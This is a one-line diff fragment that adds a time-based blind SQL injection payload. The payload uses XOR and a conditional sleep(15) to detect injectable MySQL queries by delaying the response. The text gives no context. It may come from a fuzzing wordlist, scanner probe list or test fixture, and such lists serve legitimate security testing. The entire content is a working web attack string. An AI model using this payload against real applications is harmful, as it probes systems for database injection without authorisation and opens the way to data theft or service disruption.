@@ -1,0 +1,1 @@
+10'XOR(1*if(now()=sysdate(),sleep(15),0))XOR'Z
